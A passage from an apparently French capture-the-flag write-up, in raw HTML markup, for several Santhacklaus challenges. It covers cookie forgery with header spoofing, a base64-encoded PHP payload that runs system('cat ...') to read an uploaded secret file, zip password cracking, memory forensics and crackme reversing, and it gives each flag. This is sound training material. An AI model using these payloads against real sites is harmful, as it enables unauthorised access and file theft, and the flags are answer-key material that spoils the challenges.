Cookie: &lt;span class=&quot;nv&quot;&gt;connexion&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;8aca4f36774f82a67c507cb9c96679482e2cc767f2d38502269557a566b092fb

&lt;span class=&quot;c&quot;&gt;# requête modifiée&lt;/span&gt;
GET / HTTP/1.1
Host: srht.santhacklaus.xyz
Cookie: &lt;span class=&quot;nv&quot;&gt;connexion&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;yolo
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;on recoit: &lt;code class=&quot;highlighter-rouge&quot;&gt;Hacking Attempt Detected !!! Launching russian DDoS attack to the attacker...&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;la valeur du cookie change donc le comportement du site&lt;/li&gt;
  &lt;li&gt;il faut maintenant trouver quelle fonction retourne la valeur de ce cookie&lt;/li&gt;
  &lt;li&gt;peut-être une fonction de hachage ?&lt;/li&gt;
  &lt;li&gt;partons sur fct de hash
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;md5&lt;/code&gt; : trop court&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sha512&lt;/code&gt; : trop long&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sha256&lt;/code&gt; : probale&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;(sinon on cherche sur google le hash et on s’apercoit que c’est du sha256)&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# on hash &quot;admin&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;admin&quot;&lt;/span&gt; | shasum &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; 256
8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;on remplace avec ce nouveau hash, et on a :
&lt;code class=&quot;highlighter-rouge&quot;&gt;Are you the real administrator ?
Remember: You need to come from the &quot;russian.deep-web.org&quot; website with the &quot;Black Hat Browser&quot; navigator !&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc https://srht.santhacklaus.xyz 443
GET / HTTP/1.1
Host: srht.santhacklaus.xyz
Referer: russian.deep-web.org &lt;span class=&quot;c&quot;&gt;# et non From: !!&lt;/span&gt;
User-Agent: Black Hat Browser
Cookie: &lt;span class=&quot;nv&quot;&gt;connexion&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a91
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IMTLD{B3c4u5e_sQL_iNj3cti0n5_4r3_0v3r4tt3D}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;200-3d-industry-22&quot;&gt;200 3D Industry (2/2)&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;Now that the vulnerability has been proven, the CEO is worried about some sensitive files he uploads in the administration section of the website. Let’s finish this audit properly !
Lien: https://3d-industry.santhacklaus.xyz&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;voir 3D Industry (1/2)&lt;/li&gt;
  &lt;li&gt;car même chose mais dans le dossier &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;?php echo system(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cat admin/uploads/s3cr37-d0cum3n7.txt&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;); ?&amp;gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PD9waHAgZWNobyBzeXN0ZW0oImNhdCBhZG1pbi91cGxvYWRzL3MzY3IzNy1kMGN1bTNuNy50eHQiKTsgPz4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;on récupére toutes les lignes depuis le html, qu’on met dans un fichier&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;wc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; temp.txt
  675429 temp.txt

&lt;span class=&quot;c&quot;&gt;# supprimer doublons&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;temp.txt| &lt;span class=&quot;nb&quot;&gt;uniq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; temp2.txt

&lt;span class=&quot;c&quot;&gt;# bon nombre de lignes&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;wc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; temp2.txt
  337716 temp2.txt

&lt;span class=&quot;c&quot;&gt;# c'est de la base 64&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;temp2.txt | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; temp3.txt

&lt;span class=&quot;c&quot;&gt;# type du fichier&lt;/span&gt;
file temp3.txt
temp3.txt: data ????

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n1&lt;/span&gt; temp3.txt
SketchUp STL com.sketchup.SketchUp.2018

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;temp3.txt temp3.stl
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;logiciel de dessins 3D&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://openjscad.org/&quot;&gt;https://openjscad.org/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IMTLD{3d1s4w3s0m3}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;200-trolloguess&quot;&gt;200 Trolloguess&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;Many of you realized how low the guess-level was in this CTF. But some still managed to find reasons to complain.
We’re now talking to these people. We’ll show you what real guessing is… Let’s get ready to rumble!
(Also, would our CTF be a real CTF without a challenge like this?)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;binwalk ./challenge.png

&lt;span class=&quot;c&quot;&gt;# extract&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;binwalk &lt;span class=&quot;nt&quot;&gt;--dd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;.*&quot;&lt;/span&gt; ./challenge.png

&lt;span class=&quot;c&quot;&gt;# password of zip in image with aperi'solve (step2.zip)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# new image, use &quot;outguess tool&quot; with password &quot;WHAT&quot; -&amp;gt; other pass&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;step3.zip

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;qsstv &lt;span class=&quot;c&quot;&gt;# ubuntu&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;pactl load-module module-null-sink &lt;span class=&quot;nv&quot;&gt;sink_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;virtual-cable
24
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IMTLD{gegegu3sSSGUEEESSING}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;200-can-you-see-the-flag-&quot;&gt;200 Can you SEE the flag ?&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;You cannot see it, and yet it’s here&lt;br /&gt;
Zip file&lt;br /&gt;
PS : Call me if you need to edit a video ;)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# mot de passe du zip&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;fcrackzip &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; rockyou.txt Video.zip
PASSWORD FOUND!!!!: pw &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; cheese

&lt;span class=&quot;c&quot;&gt;# extraire le son&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ffmpeg &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; Why&lt;span class=&quot;se&quot;&gt;\ \?&lt;/span&gt;.mp4 &lt;span class=&quot;nt&quot;&gt;-vn&lt;/span&gt; sound.mp3
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;utiliser Sonic Visualiser&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Layer &amp;gt; add spectrogram &amp;gt; All channels mixed&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IMTLD{50sh4d3s0fS0ng}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;250-volatility101&quot;&gt;250 Volatility101&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;Welcome to this introductory forensics challenge. You have been hired by your local police department to analyze a memory dump. This challenges is split into 3 steps. In each step, you will find a “Fl4g” (flag). Concatenate the three flags, separated by “_”, and you will have have the final flag to validate the challenge.&lt;br /&gt;
Step 1 : find the computer name → part1&lt;br /&gt;
Step 2 : find the filename of the .zip archive on the desktop → part2 (without .zip)&lt;br /&gt;
Step 3 : recover the archive’s content, you will find a file → part3&lt;br /&gt;
The final flag has to be submitted in the format &lt;code class=&quot;highlighter-rouge&quot;&gt;IMTLD{part1_part2_part3}**&lt;/code&gt;.&lt;br /&gt;
volatilty101.zip&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Step 1&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# google : volatility find hostname dump&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# https://www.aldeid.com/wiki/Volatility/Retrieve-hostname&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# profile&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ./challenge.dmp imageinfo

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ./challenge.dmp &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Win7SP1x86_23418 hivelist

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ./challenge.dmp &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Win7SP1x86_23418 printkey &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; 0x8901a1d8 &lt;span class=&quot;nt&quot;&gt;-K&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'ControlSet001\Control\ComputerName\ComputerName'&lt;/span&gt;
REG_SZ        ComputerName    : &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;S&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; WELC0M3

&lt;span class=&quot;c&quot;&gt;# autre solution&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; challenge.dmp &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Win7SP1x86_23418&quot;&lt;/span&gt; envars | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;COMPUTERNAME
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Step 2&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ./challenge.dmp &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Win7SP1x86_23418 filescan | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;zip
0x000000003e067440      8      0 RWD--- &lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;evice&lt;span class=&quot;se&quot;&gt;\H&lt;/span&gt;arddiskVolume2&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\J&lt;/span&gt;ohn&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;oTh3.zip
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Step 3&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ./challenge.dmp &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Win7SP1x86_23418 dumpfiles &lt;span class=&quot;nt&quot;&gt;-Q&lt;/span&gt; 0x000000003e067440 &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; dossier

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;dossier

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file file.None.0x85db26e0.dat
file.None.0x85db26e0.dat: Zip archive data, at least v1.0 to extract

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;file.None.0x85db26e0.dat my_file.zip

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;fcrackzip &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; /usr/share/wordlist/rockyou.txt ./my_file.zip
PASSWORD FOUND!!!!: pw &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; iamhacker

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;unzip ./my_file.zip
part3.txt password:
 extracting: part3.txt

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;part3.txt
F0r3ns1cCLUB
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IMTLD{WELC0M3_toTh3_F0r3ns1cCLUB}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;250-crackme2&quot;&gt;250 crackme2&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;gneugneugneu&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;r2 ./crack_me2
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; aaa
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; afl
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; s main
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; pdf
0x00001175      c645b1a9       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_4fh], 0xa9
0x00001179      c645b2c2       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_4eh], 0xc2
0x0000117d      c645b3cd       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_4dh], 0xcd
0x00001181      c645b48d       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_4ch], 0x8d
0x00001185      c645b599       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_4bh], 0x99
0x00001189      c645b6c0       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_4ah], 0xc0
0x0000118d      c645b7aa       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_49h], 0xaa
0x00001191      c645b8ab       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_48h], 0xab
0x00001195      c645b9b9       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_47h], 0xb9
0x00001199      c645baa9       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_46h], 0xa9
0x0000119d      c645bbc6       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_45h], 0xc6
0x000011a1      c645bc9f       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_44h], 0x9f
0x000011a5      c645bdbb       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_43h], 0xbb
0x000011a9      c645beca       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_42h], 0xca
0x000011ad      c645bfcc       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_41h], 0xcc
0x000011b1      c645c000       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_40h], 0
0x000011b5      c645909e       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_70h], 0x9e
0x000011b9      c64591a2       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_6fh], 0xa2
0x000011bd      c64592a9       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_6eh], 0xa9
0x000011c1      c64593a1       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_6dh], 0xa1
0x000011c5      c6459499       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_6ch], 0x99
0x000011c9      c64595d0       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_6bh], 0xd0
0x000011cd      c64596a9       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_6ah], 0xa9
0x000011d1      c64597bd       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_69h], 0xbd
0x000011d5      c6459886       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_68h], 0x86
0x000011d9      c64599c8       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_67h], 0xc8
0x000011dd      c6459a86       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_66h], 0x86
0x000011e1      c6459bc8       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_65h], 0xc8
0x000011e5      c6459ca3       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_64h], 0xa3
0x000011e9      c6459d85       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_63h], 0x85
0x000011ed      c6459ec9       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_62h], 0xc9
0x000011f1      c6459f98       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_61h], 0x98
0x000011f5      c645a0bd       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_60h], 0xbd
0x000011f9      c645a188       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_5fh], 0x88
0x000011fd      c645a289       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_5eh], 0x89
0x00001201      c645a3c9       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_5dh], 0xc9
0x00001205      c645a486       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_5ch], 0x86
0x00001209      c645a5c3       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_5bh], 0xc3
0x0000120d      c645a6bc       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_5ah], 0xbc
0x00001211      c645a7d2       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_59h], 0xd2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;on voit aussi un décalage de -85&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;tab&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x9e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xa2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xa9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xa1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x99&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xd0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xa9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xbd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x86&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xc8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x86&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xc8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xa3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x85&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xc9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x98&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xbd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x88&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x89&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xc9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x86&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xc3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xbc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xd2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;85&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IMTLD{Th1s1sN0tCh34t1ng}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;250-jeanclaudevd&quot;&gt;250 jeanclaude.vd&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
